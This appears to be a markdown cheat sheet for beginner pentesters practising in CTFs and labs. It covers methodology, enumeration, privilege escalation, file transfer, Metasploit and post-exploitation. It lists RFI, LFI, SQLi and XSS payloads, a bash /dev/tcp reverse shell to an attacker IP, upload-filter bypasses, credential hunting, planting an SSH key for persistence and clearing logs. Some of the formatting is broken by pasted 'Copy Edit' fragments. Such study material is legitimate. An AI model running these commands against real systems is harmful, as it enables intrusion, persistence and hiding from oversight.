# 🧠 Field Manual for Beginner to Intermediate Pentesters

A living knowledge base for CTFs, pentesting labs, and real-world practice.

---

## 📌 Table of Contents

1. [Pentesting Methodology](#pentesting-methodology)  
2. [Common Vulnerability Types](#common-vulnerability-types)  
3. [Enumeration Tools & Tips](#enumeration-tools--tips)  
4. [Privilege Escalation](#privilege-escalation)  
5. [Reverse Shell & Web Shell Tricks](#reverse-shell--web-shell-tricks)  
6. [Linux/Unix Essentials](#linuxunix-essentials)  
7. [CVE Usage & Exploit Research](#cve-usage--exploit-research)  
8. [Common Wordlists & Resources](#common-wordlists--resources)  
9. [Metasploit Crash Guide](#metasploit-crash-guide)  
10. [Post Exploitation Tips](#post-exploitation-tips)

---

## 🔍 Pentesting Methodology

### 🧭 Stages:

- **Reconnaissance**: OSINT, domain/IP info  
- **Enumeration**: Service/version detection, users, shares  
- **Gaining Access**: Exploiting known vulnerabilities or misconfigurations  
- **Privilege Escalation**: User → Root/Admin  
- **Post-Exploitation**: Cleanup, persistence, loot collection  

**Tools**:  
`nmap`, `gobuster`, `ffuf`, `nikto`, `whatweb`, `smbclient`

---

## ⚠️ Common Vulnerability Types

| Type     | Description           | Example                           |
| -------- | --------------------- | --------------------------------- |
| **RFI**  | Remote File Inclusion | `?page=http://evil.com/shell.txt` |
| **LFI**  | Local File Inclusion  | `?page=../../../../etc/passwd`    |
| **RCE**  | Remote Code Execution | Command injection via form inputs |
| **SQLi** | SQL Injection         | `' OR 1=1 -- `                    |
| **XSS**  | Cross Site Scripting  | `<script>alert('XSS')</script>`   |
| **XXE**  | XML External Entity   | External file reading via XML     |

---

## 🔧 Enumeration Tools & Tips

### Basic Scans

```bash
nmap -sC -sV -A <ip>
nmap -p- <ip>       # all ports
FTP
bash
Copy
Edit
ftp <ip>             # try anonymous login
SMB
bash
Copy
Edit
smbclient -L //<ip>/ -N
smbclient //<ip>/<share> -N
HTTP
bash
Copy
Edit
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt
🚀 Privilege Escalation
Methods
Misconfigured sudo (sudo -l)

SUID binaries (find / -perm -4000 2>/dev/null)

PATH hijacking

Writable scripts run by root (e.g. cron jobs)

Kernel exploits (uname -a)

Tools
LinEnum.sh

linpeas.sh

pspy

Reverse Shells
bash
Copy
Edit
# Attacker
nc -lvnp <port>

# Victim
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
🐚 Reverse Shell & Web Shell Tricks
PHP Reverse Shell
bash
Copy
Edit
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
Upload Bypass
Rename to .php5, .phtml

Use double extensions: shell.jpg.php

🐧 Linux/Unix Essentials
bash
Copy
Edit
whoami
id
hostnamectl
uname -a
cat /etc/passwd
sudo -l
find / -name user.txt 2>/dev/null
find / -name root.txt 2>/dev/null
File Transfer
bash
Copy
Edit
# Serve from attacker
python3 -m http.server 8000

# On victim
wget http://<attacker_ip>:8000/LinEnum.sh
📚 CVE Usage & Exploit Research
Check service versions (from nmap -sV)

Search for exploits:

https://exploit-db.com

https://github.com

https://www.cvedetails.com

searchsploit <service>

📁 Common Wordlists & Resources
Name	Use
rockyou.txt	Bruteforcing passwords
SecLists	Directories, payloads, usernames
pentestmonkey	Reverse shell cheats

💥 Metasploit Crash Guide
bash
Copy
Edit
msfconsole
search exploit <service>
use exploit/<path>
set RHOSTS <ip>
set PAYLOAD <payload>
set LHOST <your_ip>
set LPORT <port>
run
🧹 Post Exploitation Tips
Enumerate users and passwords

Check for creds in /var/www, .bash_history, .ssh/

Check cron jobs: cat /etc/crontab

Add your SSH key if writable: ~/.ssh/authorized_keys

Clear logs if needed


